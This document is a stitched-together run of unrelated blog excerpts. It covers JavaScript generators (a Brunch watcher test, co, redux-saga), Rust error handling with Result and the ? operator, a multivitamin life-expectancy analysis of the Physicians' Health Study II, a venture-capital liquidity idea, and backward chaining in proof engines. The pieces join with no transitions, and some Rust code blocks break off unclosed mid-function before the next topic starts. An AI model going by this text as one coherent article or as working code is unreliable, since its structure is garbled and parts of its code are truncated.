  <span>t</span><span>.</span><span>false</span><span>(</span><span>fs</span><span>.</span><span>readdirSync</span><span>(</span><span>'./node_modules'</span><span>).</span><span>includes</span><span>(</span><span>'lodash'</span><span>));</span>

  <span>// make changes</span>
  <span>const</span> <span>packageJson</span> <span>=</span> <span>JSON</span><span>.</span><span>parse</span><span>(</span><span>fs</span><span>.</span><span>readFileSync</span><span>(</span><span>'package.json'</span><span>,</span> <span>'utf8'</span><span>));</span>
  <span>packageJson</span><span>.</span><span>dependencies</span><span>.</span><span>lodash</span> <span>=</span> <span>'*'</span><span>;</span>
  <span>fs</span><span>.</span><span>writeFileSync</span><span>(</span><span>'package.json'</span><span>,</span> <span>JSON</span><span>.</span><span>stringify</span><span>(</span><span>packageJson</span><span>,</span> <span>null</span><span>,</span> <span>2</span><span>));</span>

  <span>yield</span> <span>compilation</span><span>();</span> <span>// pause and wait</span>
  <span>// assert they were reflected</span>
  <span>t</span><span>.</span><span>true</span><span>(</span><span>fs</span><span>.</span><span>readdirSync</span><span>(</span><span>'./node_modules'</span><span>).</span><span>includes</span><span>(</span><span>'lodash'</span><span>));</span>
  <span>t</span><span>.</span><span>end</span><span>();</span>
<span>});</span>
</code></pre></div></div>

<p>As you can see, it reads pretty linearly and naturally.</p>

<p>In this case, <code>watch</code> is an interpreter which allows us to pause and wait for the compilation to finish.
If you are wondering how it’s implemented: <a href="https://github.com/brunch/brunch/blob/1955d0d03785797fb244d27e194450da9b31e4ae/test/watch.js#L20-37">simple</a>.</p>

<p>The generator function is a program which ensures the watcher is working properly.</p>

<p><em>(The non-generator version of this test used to have a callback with a counter, pretty messy: <a href="https://github.com/brunch/brunch/commit/f9086f18d6763cbd7d28b241fb492d7a09854c01">commit</a>.)</em></p>

<h3 id="2-co">2. co</h3>

<p><a href="https://github.com/tj/co">co</a> is a generator interpreter which allows you to write nicer, more linear code for promises.</p>

<p>Instead of this nested code:</p>

<div><div><pre><code><span>getUser</span><span>().</span><span>then</span><span>(</span><span>user</span> <span>=&gt;</span> <span>getComments</span><span>(</span><span>user</span><span>))</span>
</code></pre></div></div>

<p>You have this:</p>

<div><div><pre><code><span>co</span><span>(</span><span>function</span><span>*</span> <span>()</span> <span>{</span>
  <span>const</span> <span>user</span> <span>=</span> <span>yield</span> <span>getUser</span><span>();</span>
  <span>const</span> <span>comments</span> <span>=</span> <span>yield</span> <span>getComments</span><span>(</span><span>user</span><span>);</span>
<span>});</span>
</code></pre></div></div>

<p>Basically, async-await implemented in the userland.</p>

<h3 id="3-redux-saga">3. redux-saga</h3>

<p><a href="https://github.com/yelouafi/redux-saga">redux-saga</a> makes managing side-effects in the Redux architecture a breeze.</p>

<p>Instead of scattering them across dozens of action creators and reducers, you group logically related pieces of behavior in a program called <strong>saga</strong>.</p>

<p>Redux-saga can interpret many commands.
Among the most popular are:</p>

<ul>
  <li><code>take(ACTION_NAME)</code> — wait for an action of <code>ACTION_NAME</code> to be dispatched. Returns the action object</li>
  <li><code>put(action)</code> — dispatch an <code>action</code></li>
  <li><code>call(promiseFn)</code> — calls a function that returns a promise, and waits for it to resolve. Returns what the promise resolved to</li>
  <li>&amp; others</li>
</ul>

<p>An example would be:</p>

<div><div><pre><code><span>function</span><span>*</span> <span>welcomeSaga</span><span>()</span> <span>{</span>
  <span>yield</span> <span>take</span><span>(</span><span>'REGISTRATION_FINISHED'</span><span>);</span>
  <span>yield</span> <span>put</span><span>(</span><span>showWelcomePopup</span><span>());</span>
<span>}</span>

<span>sagaMiddleware</span><span>.</span><span>run</span><span>(</span><span>welcomeSaga</span><span>);</span>
</code></pre></div></div>

<p>(I have <a href="https://goshakkk.name/lazy-auth-redux-saga-flow/">a concrete example of Redux-Saga application to improve user experience</a>.)</p>

<h2 id="conclusion">Conclusion</h2>

<p>As can be evidenced by the examples, generators are a really powerful tool that lets you have cleaner code — especially when it comes to any kind of async behavior.</p>

<p>A side benefit of generators is <strong>easier testing</strong>.
For example, you could test a program by writing a different interpreter, that asserts the <code>yield</code>ed commands without executing them.</p>

<p>Let’s begin with two excerpts from the paper <a href="http://www.eecg.toronto.edu/~yuan/papers/failure_analysis_osdi14.pdf">Simple Testing Can Prevent Most
Critical Failures: An Analysis of Production Failures in Distributed
Data-intensive
Systems</a></p>

<div><div><pre><code>almost all (92%) of the catastrophic system failures
are the result of incorrect handling of non-fatal errors
explicitly signaled in software.
</code></pre></div></div>

<div><div><pre><code>in 58% of the catastrophic failures, the underlying
faults could easily have been detected through simple
testing of error handling code.
</code></pre></div></div>

<p>These stats haunt me. They cause me to frequently ask myself “how can I design
my systems to increase the chances that errors will be handled correctly?”</p>

<p>This leads to two goals:</p>

<ol>
  <li>when an error happens, it is handled correctly</li>
  <li>error handling logic is triggered under test</li>
</ol>



<p>In Rust, error handling is centered around the <code>Result</code> enum and the try <code>?</code>
operator.</p>

<p><code>Result</code> is <a href="https://doc.rust-lang.org/std/result/enum.Result.html">defined like this</a>:</p>

<div><div><pre><code><span>pub</span> <span>enum</span> <span>Result</span><span>&lt;</span><span>T</span><span>,</span> <span>E</span><span>&gt;</span> <span>{</span>
    <span>Ok</span><span>(</span><span>T</span><span>),</span>
    <span>Err</span><span>(</span><span>E</span><span>),</span>
<span>}</span>

<span>// This `use` lets us write `Ok(Happy)` instead</span>
<span>// of `Result::Ok(Happy)` as we need to do with</span>
<span>// other enums by default.</span>
<span>pub</span> <span>use</span> <span>Result</span><span>::{</span><span>Ok</span><span>,</span> <span>Err</span><span>};</span>
</code></pre></div></div>

<p>and it is used like this:</p>

<div><div><pre><code><span>fn</span> <span>may_fail</span><span>()</span> <span>-&gt;</span> <span>Result</span><span>&lt;</span><span>Happy</span><span>,</span> <span>Sad</span><span>&gt;</span> <span>{</span>
  <span>if</span> <span>/* function succeeded */</span> <span>{</span>
    <span>Ok</span><span>(</span><span>Happy</span><span>)</span>
  <span>}</span> <span>else</span> <span>{</span>
    <span>Err</span><span>(</span><span>Sad</span><span>)</span>
  <span>}</span>
<span>}</span>
</code></pre></div></div>

<p>We use <code>Result</code> to represent an operation which may succeed or fail. We tend
not to write many functions that accept <code>Result</code>s as arguments, because a
<code>Result</code> fundamentally represents uncertainty about whether an operation will
succeed or not. By the time we have an actual <code>Result</code> object, we no longer
have uncertainty about whether the operation was successful or not. We know
what happened. Results tend to flow backwards to callers, rather than forwards
into newly called functions.</p>

<p>Error handling may begin once it is known that an error has occurred.
However, we often do not wish to handle an error at the exact point
in which it is known to have happened. Imagine this code:</p>

<div><div><pre><code><span>fn</span> <span>may_fail</span><span>()</span> <span>-&gt;</span> <span>Result</span><span>&lt;</span><span>Happy</span><span>,</span> <span>Sad</span><span>&gt;</span> <span>{</span>
  <span>/* either returns Ok(Happy) or Err(Sad) */</span>
<span>}</span>

<span>fn</span> <span>caller</span><span>()</span> <span>{</span>
  <span>match</span> <span>may_fail</span><span>()</span> <span>{</span>
    <span>Ok</span><span>(</span><span>happy</span><span>)</span> <span>=&gt;</span> <span>println!</span><span>(</span><span>":)"</span><span>),</span>
    <span>Err</span><span>(</span><span>sad</span><span>)</span> <span>=&gt;</span> <span>{</span>
      <span>eprintln!</span><span>(</span><span>":("</span><span>);</span>
      <span>/* handle error */</span>
      <span>return</span><span>;</span>
    <span>}</span>
  <span>}</span>
  <span>match</span> <span>may_fail</span><span>()</span> <span>{</span>
    <span>Ok</span><span>(</span><span>happy</span><span>)</span> <span>=&gt;</span> <span>println!</span><span>(</span><span>":)"</span><span>),</span>
    <span>Err</span><span>(</span><span>sad</span><span>)</span> <span>=&gt;</span> <span>{</span>

<p>Error handling can easily become repetitive and error-prone. Error handling
logic is an area where applying the <a href="https://en.wikipedia.org/wiki/Single-responsibility_principle">single responsibility
principle</a> can
really reduce bugs over time. If handling of a particular kind of
error can happen in one place, you can eliminate the chance that a bug
will happen because you forgot to refactor 1 out of 5 places where a
concern is handled in your codebase. These bugs are really easy to
introduce when refactoring Rust, as we tend to spend so much
energy fixing compiler errors during refactors that we may forget
to sweep through the codebase and check to make sure that it has
remained coherent and that all separate locations of similar
techniques have remained in-sync with each other.</p>

<p>It’s quite easy to do a refactor of the above code and end
up with something like this, where the last instance missed
the newly changed logic:</p>

<div><div><pre><code><span>match</span> <span>may_fail</span><span>()</span> <span>{</span>
  <span>Ok</span><span>(</span><span>happy</span><span>)</span> <span>=&gt;</span> <span>println!</span><span>(</span><span>":)"</span><span>),</span>
  <span>Err</span><span>(</span><span>sad</span><span>)</span> <span>=&gt;</span> <span>{</span>
    <span>eprintln!</span><span>(</span><span>":("</span><span>);</span>
    <span>/* handle error */</span>
    <span>/* new and improved extra step */</span>
    <span>return</span><span>;</span>
  <span>}</span>
<span>}</span>
<span>match</span> <span>may_fail</span><span>()</span> <span>{</span>
  <span>Ok</span><span>(</span><span>happy</span><span>)</span> <span>=&gt;</span> <span>println!</span><span>(</span><span>":)"</span><span>),</span>
  <span>Err</span><span>(</span><span>sad</span><span>)</span> <span>=&gt;</span> <span>{</span>
    <span>eprintln!</span><span>(</span><span>":("</span><span>);</span>
    <span>/* handle error */</span>
    <span>/* new and improved extra step */</span>
    <span>return</span><span>;</span>
  <span>}</span>
<span>}</span>
<span>match</span> <span>may_fail</span><span>()</span> <span>{</span>
  <span>Ok</span><span>(</span><span>happy</span><span>)</span> <span>=&gt;</span> <span>println!</span><span>(</span><span>":)"</span><span>),</span>
  <span>Err</span><span>(</span><span>sad</span><span>)</span> <span>=&gt;</span> <span>{</span>
    <span>eprintln!</span><span>(</span><span>":("</span><span>);</span>
    <span>/* handle error */</span>
                    <span>&lt;-----</span> <span>we</span> <span>forgot</span> <span>to</span> <span>update</span> <span>this</span>
    <span>return</span><span>;</span>
  <span>}</span>
<span>}</span>
</code></pre></div></div>

<p>So, it helps to centralize the error handling logic:</p>

<div><div><pre><code><span>fn</span> <span>may_fail</span><span>()</span> <span>-&gt;</span> <span>Result</span><span>&lt;</span><span>Happy</span><span>,</span> <span>Sad</span><span>&gt;</span> <span>{</span>
  <span>/* either returns Ok(Happy) or Err(Sad) */</span>
<span>}</span>

<span>fn</span> <span>call_and_handle</span><span>()</span> <span>{</span>
  <span>match</span> <span>may_fail</span><span>()</span> <span>{</span>
    <span>Ok</span><span>(</span><span>happy</span><span>)</span> <span>=&gt;</span> <span>println!</span><span>(</span><span>":)"</span><span>),</span>
    <span>Err</span><span>(</span><span>sad</span><span>)</span> <span>=&gt;</span> <span>{</span>
      <span>eprintln!</span><span>(</span><span>":("</span><span>);</span>
      <span>/* handle error */</span>
      <span>/* new and improved extra step */</span>
      <span>return</span><span>;</span>
    <span>}</span>
  <span>}</span>
<span>}</span>

<span>fn</span> <span>caller</span><span>()</span> <span>{</span>
  <span>call_and_handle</span><span>();</span>
  <span>call_and_handle</span><span>();</span>
  <span>call_and_handle</span><span>();</span>
  <span>println!</span><span>(</span><span>"I am so happy right now"</span><span>);</span>
<span>}</span>
</code></pre></div></div>

<p>Unfortunately, the intent of the original program has been distorted. We will
now print “I am so happy right now” even after experiencing some failures from
the <code>may_fail()</code> function. We also keep calling <code>call_and_handle()</code> even if
the last call failed. We want to short-circuit that print statement, as well
as subsequent calls to <code>call_and_handle</code>, as soon as the first one encounters
issues.</p>

<p>Here is where we start to get into precarious territory by introducing
the try <code>?</code> operator to add short-circuiting logic.</p>

<div><div><pre><code><span>fn</span> <span>may_fail</span><span>()</span> <span>-&gt;</span> <span>Result</span><span>&lt;</span><span>Happy</span><span>,</span> <span>Sad</span><span>&gt;</span> <span>{</span>
  <span>/* either returns Ok(Happy) or Err(Sad) */</span>
<span>}</span>

<span>fn</span> <span>call_and_handle</span><span>()</span> <span>-&gt;</span> <span>Result</span><span>&lt;</span><span>(),</span> <span>()</span><span>&gt;</span> <span>{</span>
  <span>match</span> <span>may_fail</span><span>()</span> <span>{</span>
    <span>Ok</span><span>(</span><span>happy</span><span>)</span> <span>=&gt;</span> <span>{</span>
      <span>println!</span><span>(</span><span>":)"</span><span>);</span>
      <span>Ok</span><span>(())</span>
    <span>},</span>
    <span>Err</span><span>(</span><span>sad</span><span>)</span> <span>=&gt;</span> <span>{</span>
      <span>eprintln!</span><span>(</span><span>":("</span><span>);</span>
      <span>/* handle error */</span>
      <span>/* new and improved extra step */</span>
      <span>Err</span><span>(())</span>
    <span>}</span>
  <span>}</span>
<span>}</span>

<span>fn</span> <span>caller</span><span>()</span> <span>-&gt;</span> <span>Result</span><span>&lt;</span><span>(),</span> <span>()</span><span>&gt;</span> <span>{</span>
  <span>call_and_handle</span><span>()</span><span>?</span><span>;</span>
  <span>call_and_handle</span><span>()</span><span>?</span><span>;</span>
  <span>call_and_handle</span><span>()</span><span>?</span><span>;</span>
  <span>println!</span><span>(</span><span>"I am so happy right now"</span><span>);</span>
  <span>Ok</span><span>(())</span>
<span>}</span>
</code></pre></div></div>

<p>This fulfils the above constraints, but we have now made <code>caller</code> return a
<code>Result</code>, even when we have already handled any errors that it may have
encountered. Callers of <code>caller</code> don’t need to care about any issues that have
cropped up during its execution, because it has already handled them. We do not
want our handled errors to propagate any information at all to the caller,
because it only allows them to begin to be concerned about an issue that they
are not responsible for handling in any way. This is as unhealthy in programs
as it is in human relationships, as it encourages core concerns to be handled
by an entity that has less information about that core concern, resulting in
harmful coupling and more bugs over time.</p>

<p>Any callers of the <code>caller()</code> function will start to get compiler warnings
if they don’t use the <code>Result</code> that is returned:</p>

<div><div><pre><code>warning: unused `std::result::Result` that must be used
 --&gt; src/main.rs:6:5
  |
  |     caller();
  |     ^^^^^^^^^
  |
  = note: `#[warn(unused_must_use)]` on by default
  = note: this `Result` may be an `Err` variant,
          which should be handled
</code></pre></div></div>

<p>So, you could easily imagine someone writing code like this, with a <code>main()</code>
function that uses the try <code>?</code> operator to get rid of that compiler warning:</p>

<div><div><pre><code><span>fn</span> <span>may_fail</span><span>()</span> <span>-&gt;</span> <span>Result</span><span>&lt;</span><span>Happy</span><span>,</span> <span>Sad</span><span>&gt;</span> <span>{</span>
  <span>/* either returns Ok(Happy) or Err(Sad) */</span>
<span>}</span>

<span>fn</span> <span>call_and_handle</span><span>()</span> <span>-&gt;</span> <span>Result</span><span>&lt;</span><span>(),</span> <span>()</span><span>&gt;</span> <span>{</span>
  <span>match</span> <span>may_fail</span><span>()</span> <span>{</span>
    <span>Ok</span><span>(</span><span>happy</span><span>)</span> <span>=&gt;</span> <span>{</span>
      <span>println!</span><span>(</span><span>":)"</span><span>);</span>
      <span>Ok</span><span>(())</span>
    <span>},</span>
    <span>Err</span><span>(</span><span>sad</span><span>)</span> <span>=&gt;</span> <span>{</span>
      <span>eprintln!</span><span>(</span><span>":("</span><span>);</span>
      <span>/* handle error */</span>
      <span>/* new and improved extra step */</span>
      <span>Err</span><span>(())</span>
    <span>}</span>
  <span>}</span>
<span>}</span>

<span>fn</span> <span>caller</span><span>()</span> <span>-&gt;</span> <span>Result</span><span>&lt;</span><span>(),</span> <span>()</span><span>&gt;</span> <span>{</span>
  <span>call_and_handle</span><span>()</span><span>?</span><span>;</span>
  <span>call_and_handle</span><span>()</span><span>?</span><span>;</span>
  <span>call_and_handle</span><span>()</span><span>?</span><span>;</span>
  <span>println!</span><span>(</span><span>"I am so happy right now"</span><span>);</span>
  <span>Ok</span><span>(())</span>
<span>}</span>

<span>fn</span> <span>main</span><span>()</span> <span>-&gt;</span> <span>Result</span><span>&lt;</span><span>(),</span> <span>()</span><span>&gt;</span> <span>{</span>
  <span>caller</span><span>()</span><span>?</span><span>;</span>
  <span>caller</span><span>()</span><span>?</span><span>;</span>
  <span>caller</span><span>()</span>
<span>}</span>
</code></pre></div></div>

<p>This gets rid of the compiler warning. However, this is buggy, because the
<code>caller()</code> function already wipes its own ass, and we don’t need to care about
its success. If the intent is to call it 3 times, we now are encouraged by the
compiler to early-exit as well.</p>

<p>The try <code>?</code> operator can save us a lot of effort, but it also has risks. We are
enticed by the easy early return. But try <code>?</code> is fundamentally about
propagation. And we must only use it when we require that the caller handles
the issue that has popped up.</p>

<p>Our intention is to call <code>caller()</code> 3 times in <code>main()</code>, regardless of whether
<code>caller()</code> needs to handle errors internally or not. This is what we really
want:</p>

<div><div><pre><code><span>fn</span> <span>may_fail</span><span>()</span> <span>-&gt;</span> <span>Result</span><span>&lt;</span><span>Happy</span><span>,</span> <span>Sad</span><span>&gt;</span> <span>{</span>
  <span>/* either returns Ok(Happy) or Err(Sad) */</span>
<span>}</span>

<span>fn</span> <span>call_and_handle</span><span>()</span> <span>-&gt;</span> <span>bool</span> <span>{</span>
  <span>match</span> <span>may_fail</span><span>()</span> <span>{</span>
    <span>Ok</span><span>(</span><span>happy</span><span>)</span> <span>=&gt;</span> <span>{</span>
      <span>println!</span><span>(</span><span>":)"</span><span>);</span>
      <span>true</span>
    <span>},</span>
    <span>Err</span><span>(</span><span>sad</span><span>)</span> <span>=&gt;</span> <span>{</span>
      <span>eprintln!</span><span>(</span><span>":("</span><span>);</span>
      <span>/* handle error */</span>
      <span>/* new and improved extra step */</span>
      <span>false</span>
    <span>}</span>
  <span>}</span>
<span>}</span>

<span>fn</span> <span>caller</span><span>()</span> <span>{</span>
  <span>// using &amp;&amp; will also short-circuit evaluation</span>
  <span>if</span> <span>call_and_handle</span><span>()</span>
    <span>&amp;&amp;</span> <span>call_and_handle</span><span>()</span>
    <span>&amp;&amp;</span> <span>call_and_handle</span><span>()</span> <span>{</span>
    <span>println!</span><span>(</span><span>"I am so happy right now"</span><span>);</span>
  <span>}</span>
<span>}</span>

<span>fn</span> <span>main</span><span>()</span> <span>{</span>
  <span>// our intention is to call `caller()` 3 times,</span>
  <span>// whether it needs to handle errors internally</span>
  <span>// or not.</span>
  <span>caller</span><span>();</span>
  <span>caller</span><span>();</span>
  <span>caller</span><span>();</span>
<span>}</span>
</code></pre></div></div>



<p>There is a tendency in the Rust community to throw all errors into a single
global error type, which is a big enum that holds the various possible errors
that may have been encountered at any point anywhere in the program. It’s easy
to see how this makes working with errors super easy.</p>

<p>But it’s easy for the wrong reasons.</p>

<p>Remember our first goal from the beginning of this article:</p>

<div><div><pre><code>1. when an error happens, it is handled correctly
</code></pre></div></div>

<p>If we have different errors that pop up in different parts of our programs,
our goal is for those errors to be handled correctly. This is almost
impossible to do correctly when all possible errors may end up being
converted into this big-ball-of-mud single error enum.</p>

<p>Imagine this system where we are expecting to encounter both handlable simple
errors and much more serious fatal errors. We will use the global error enum
style that has become popular:</p>

<div><div><pre><code><span>struct</span> <span>LocalError</span><span>;</span>
<span>struct</span> <span>FatalError</span><span>;</span>

<span>enum</span> <span>Error</span> <span>{</span>
  <span>Local</span><span>(</span><span>LocalError</span><span>),</span>
  <span>Fatal</span><span>(</span><span>FatalError</span><span>),</span>
<span>}</span>

<span>// these conversions allow the try `?` operator</span>
<span>// to automatically turn a specific error into</span>
<span>// the global `Error` when early-returning</span>
<span>// from functions</span>
<span>impl</span> <span>From</span><span>&lt;</span><span>LocalError</span><span>&gt;</span> <span>for</span> <span>Error</span> <span>{</span>
  <span>// Error::Local(LocalError)</span>
<span>}</span>
<span>impl</span> <span>From</span><span>&lt;</span><span>FatalError</span><span>&gt;</span> <span>for</span> <span>Error</span> <span>{</span>
  <span>// Error::Fatal(FatalError)</span>
<span>}</span>

<span>fn</span> <span>subtask_a</span><span>()</span> <span>-&gt;</span> <span>Result</span><span>&lt;</span><span>(),</span> <span>LocalError</span><span>&gt;</span> <span>{</span>
  <span>/* perform work, maybe fail */</span>
<span>}</span>

<span>fn</span> <span>subtask_b</span><span>()</span> <span>-&gt;</span> <span>Result</span><span>&lt;</span><span>(),</span> <span>FatalError</span><span>&gt;</span> <span>{</span>
  <span>/* perform work, maybe fail */</span>

<p>Wild claims about vitamin supplements fly all over the internet. My Facebook feed is little more than a series of ads for vitamins, potions, and blood tests that promise to turn me into an immortal David Hasselhoff. So what does the best science tell us about vitamin supplements for people who haven’t been diagnosed with a nutritional deficiency by their doctor? Will they help us live for 115 years?</p>



<p><strong>Physicians’ Health Study</strong></p>



<p>The biggest and longest study of multivitamin supplements is the<a href="https://phs.bwh.harvard.edu/phs2.htm"> Physicians’ Health Study II</a>. The study, which ran from 1997 to 2011, enrolled nearly 15,000 male doctors over the age of 50. The doctors were randomly assigned to take real or placebo versions of a common multivitamin (Centrum Silver), and their health outcomes were followed for around 11 years.</p>



<p>For the first few years, the doctors were also randomized to vitamin C, vitamin E, and beta-carotene. These supplements were part of shorter trials that, in the end, showed that those supplements had no effect on cardiovascular disease or cancer.</p>



<p>When<a href="https://www.ncbi.nlm.nih.gov/pmc/articles/PMC3501249/"> results</a> of the multivitamin trial were published in 2012, it was “the only large-scale trial testing the effects of long-term use of a common multivitamin.” After some searching on Google Scholar, I believe that’s still the case today. Other studies of vitamin supplements are smaller, shorter, and typically focus on only one or a few vitamins.</p>



<p><strong>Results</strong></p>



<p>The study researchers looked particularly for any differences between the placebo and treatment groups in cancer incidence (excluding non-melanoma skin cancers, which are common, rarely fatal, and mediated largely by sun exposure) and major cardiovascular events such as heart attack and strokes. The study also measured total mortality.</p>



<p>The study found almost exactly no difference in the incidence of major cardiovascular events, an<a href="https://jamanetwork.com/journals/jama/fullarticle/1380451"> 8% decrease in cancer</a> that barely reached statistical significance, and a 6% decrease in total mortality that didn’t quite reach significance.</p>



<p><strong>Effect on life expectancy</strong></p>



<p>The 6% relative reduction in mortality came with a wide uncertainty interval, from a 2% increase to a 12% decrease, which is why it didn’t reach statistical significance. But let’s assume that the 6% value is correct. How does that translate to life expectancy? It’s tempting to guess that remaining life expectancy should increase by 6%, but as a committed anti-aging geek, I know that’s not the right way to think about it.&nbsp;</p>



<p>The correct approach is to start with the baseline probability of dying in any given year, then to multiply that probability by 0.94 (i.e., 6% or 0.06 less than without a multivitamin) to calculate a new life expectancy. I’ve done the calculation for you in<a href="https://docs.google.com/spreadsheets/d/1bJ__PTXxw62DKRAkdjCpFrkQpEfchEYjsGbNNKUmvP8/edit?usp=sharing"> this</a> Google Sheet using the<a href="https://www.ssa.gov/oact/STATS/table4c6.html"> Social Security Administration’s actuarial tables</a> as a basis for the unsupplemented life expectancy. The life expectancy at age 50 rises from 29.7 to 30.3 years for a man and from 33.2 to 33.8 years for a woman. The plot below shows the survival probabilities over time.</p>



<figure><img src="https://lh3.googleusercontent.com/71Q3BzDia2S_YtyoU3wYnppkJqqNRla-hmbWPwYVJUXF3ABK6z907bPYgqnctM9S8J8N5E6eeesfsrGlhS-CDB-JW_XML5bdyOIDd-K3vGNRLp4vIdpvsNoev2pOCTKeGdDzv24D" alt="" title="Chart"></figure>



<p><strong>Cost v. extra life</strong></p>



<p>An extra 0.6 years might sound measly, but compare that to the cost. Centrum Silver is on Amazon for seven cents a pill. My grocery store had another brand with identical nutritional content for even less. At a cost of seven cents a day, a lifetime supply of Centrum Silver on your fiftieth birthday would set you back $758 if you’re a man or $849 if you’re a woman. So the hit to your wallet won’t be significant. Taking one pill a day is easy, and price wise it’s an absolute bargain.</p>



<p><strong>Side effects</strong></p>



<p>The only significant side effect of the multivitamin was a 7% increase in rashes, but it’s worth noting that the reliability of this is statistically questionable. The authors tested for 13 different side effects, but the standard p-value calculation assumes you’re only testing one hypothesis. If you’re testing 13 hypotheses, you’re more likely to get a false positive and should accordingly adjust the threshold of significance. The authors don’t seem to have done that, so it’s plausible the apparent increase in rashes happened by chance.</p>



<p>If a multivitamin supplement truly increases the risk of rashes, it’s hardly a game-changer: You could easily stop taking it and see a doctor about the rash.</p>



<p>There were also side effects reported regarding minor bleeding in multivitamin-takers, but these were inconsistent. The treatment group showed a small decrease in blood in the urine, a small increase in bloody noses, and no change in bruising. The authors don’t mention this as meaningful.&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</p>



<p><strong>Caveat alert</strong></p>



<p>I’ll be the first to admit how imperfect my above survival calculation is. I’ve already pointed out the wide uncertainty around the 6% relative reduction in mortality. Plus the Physicians’ Health Study was run on a group of highly educated, highly paid men, most of whom exercised regularly and very few of whom smoked. It’s not clear how the benefits transfer to a more typical man or a woman. Finally, as the authors themselves point out, they didn’t check whether the study subjects were deficient in any nutrients to start with. Such deficiencies could make a real difference to the effect of a multivitamin supplement.</p>



<p>Still, it’s reasonable to conclude that taking a daily multivitamin starting in middle age is more likely than not to extend life expectancy on the order of months. I once tested very low for vitamin D, so my own doctor has told me to take a multivitamin with at least 1,000 IU of vitamin D – which includes Centrum Silver – even though I’m well below 50. In retrospect, the cost of the multivitamin is so low compared to the test, I should have just skipped the test and gone straight to the supplement. Based on the Physicians’ Health Study II, the multivitamin might have something beneficial in it even besides the Vitamin D.</p>

To fully grasp the importance of this idea, it’s important to know how venture capital funds work. You can read more about <a href="https://hbr.org/1998/11/how-venture-capital-works">Venture Capital’s history at this 1998 HBR article</a>, or just see below for a summary from <a href="http://www.fundingpost.com/investor-presentations/How-Venture-Capital-Firms-Work.asp#:~:text=When%20individual%20investors%20entrust%20their,around%20three%20to%20seven%20years.">FundingPost</a>:</p><blockquote><p><em>A venture capital firm is a group of investors who gain income from wealthy people who want to grow their wealth. They take this money and use it to invest in more risky businesses than a traditional bank is willing to take on…. When individual investors entrust their money to a venture capital firm, the firm puts the money in a fund. This fund is then invested in several companies, with the expectation that the companies will be able to </em><strong><em>repay the money in around three to seven years</em></strong><em>. This money is repaid either when the company takes their business public and starts selling stocks and bonds, or when the company is acquired by another company. The money is then paid back to the venture capital firm, with interest. Sometimes, the money is repaid through shares of stock in the company. O</em><strong><em>nce all of the money in a particular fund is returned, the money, with the interest earned, is then sent back to the investors. Of course, the firm takes a portion of the money as their fee.</em></strong></p></blockquote><p>The primary model of venture capital is get $xM from Limited Partners —&gt; General partners deploy it —&gt; wait for returns —&gt; <span>wait some more (5, 7, 10 years…) </span>—&gt; distribute returns from the fund! During that “waiting period” there is an untapped opportunity to allow and create a market for trading the rights for the distributed returns of a venture capital fund. This would allow for more liquidity for fund investors (especially if investors perceive that a fund is performing poorly) while also giving new investors the opportunity to buy into funds that they think are promising later in the fund’s lifecycle.  </p><p><a href="https://www.toptal.com/finance/venture-capital-consultants/state-of-venture-capital-industry-2019#:~:text=The%20year%20of%202018%20saw,has%20abated%20to%20an%20extent.">Venture capital is a $280 billion market</a>: transacting just 1% of this with a 10% trading fee (or less) could easily create a billion dollar business.

    <section>
        <p><a href="https://www.uxmatters.com/mt/archives/2018/01/a-shift-from-engineering-driven-to-design-driven-business-models.php"><u>Internet</u></a> <a href="https://twitter.com/sachinrekhi/status/1232412946434641920"><u>ink</u></a> <a href="https://www.productplan.com/product-culture-mistakes/"><u>spills</u></a> <a href="https://twitter.com/AustinTByrd/status/1104466068146335744?s=20"><u>occasionally</u></a> <a href="https://twitter.com/tsunanet/status/1234866890670923776"><u>about</u></a> a distinction between “product-driven” and “engineering-driven” software cultures. These terms are somewhat vague – apparently companies like Google are “engineering-driven” and companies like Amazon or Apple are “product-driven,” though I can’t speak to that.</p>
<p>I’d summarize the two mentalities like this:</p>
<p><strong>Product-driven approach</strong></p>
<ol type="1">
<li>???</li>
<li>Ship desirable feature</li>
<li>Profit</li>
</ol>
<p><strong>Engineering-driven approach</strong></p>
<ol type="1">
<li>Write desirable code</li>
<li>???</li>
<li>Profit</li>
</ol>
<p>This reminds me a little bit of “backward chaining” and “forward chaining”: the two basic “inference methods” that proof engines use when searching for proofs.</p>
<p>“Backward chaining” is when you start from the proposition you hope to prove, your “goal”, and proceed by identifying “subgoals”, the proof of which would amount to proving your “goal”, and then identifying subgoals of those subgoals, and so forth, until you reach subgoals that can be proven directly.</p>
<p>For example, suppose you want to prove the proposition “Prince Andrew and Prince William are related” given the following facts and rules:</p>
<ul>
<li><strong>Fact 1.</strong> Queen Elizabeth is a parent of Prince Andrew.</li>
<li><strong>Fact 2.</strong> Queen Elizabeth is a parent of Prince Charles.</li>
<li><strong>Fact 3.</strong> Prince Charles is a parent of Prince William.</li>
<li><strong>Rule 4.</strong> If X is a parent of Y, then X is an ancestor of Y</li>
<li><strong>Rule 5.</strong> If X is an ancestor of Y, and Y is an ancestor of Z, then X is an ancestor of Z.</li>
<li><strong>Rule 6.</strong> If X is an ancestor of Y, and X is an ancestor of Z, then Y and Z are related.</li>
</ul>
<p>With backward chaining, you take your goal, look for a rule where the “consequent” (the part after the “then”) matches your goal, and then the antecedent (the part before the “then” and after “if”) becomes your “subgoal.” Then you add variable substitution with backtracking, and the ability to split conjunctions (“and”), according to some rules that I won’t lay out explicitly (and also am not that confident in, I am only very superficially acquainted with this subject matter). Still, I’ll run through an example. It’s lengthy and rather boring – skip ahead once you’ve get the gist.</p>
<ol type="1">
<li>Start with the goal “Prince Andrew and Prince William are related”.</li>
<li>Notice that this matches the consequent of rule 6 “Y and Z are related”, with Y=“Prince Andrew” and Z=“Prince William”.</li>
<li>Substitute into the antecedent of rule 6: “X is an ancestor of Prince Andrew and X is an ancestor of Prince William”. This is our new subgoal. This makes sense – Princes Andrew and William are related if they share X, a common ancestor. Now who might that common ancestor be?</li>
<li>Try X = Prince Charles. Of course, we know the common ancestor is not Charles. But we are pretending to be a proof engine, which isn’t smart enough to know and must try every possibility. Now our new subgoal is “Prince Charles is an ancestor of Prince Andrew, and Prince Charles is an ancestor of Prince William.”</li>
<li>Break up the conjunction. See if we can satisfy “Prince Charles is an ancestor of Prince Andrew”.</li>
<li>Notice that it matches the consequent of rule 4, “X is an ancestor of Y” with X = Prince Charles and Y = Prince Andrew.</li>
<li>Substitute into the antecedent of rule 4 for “Prince Charles is a parent of Prince Andrew.”</li>
<li>Uh oh, this cannot be satisfied and doesn’t match the consequence of any rule.</li>
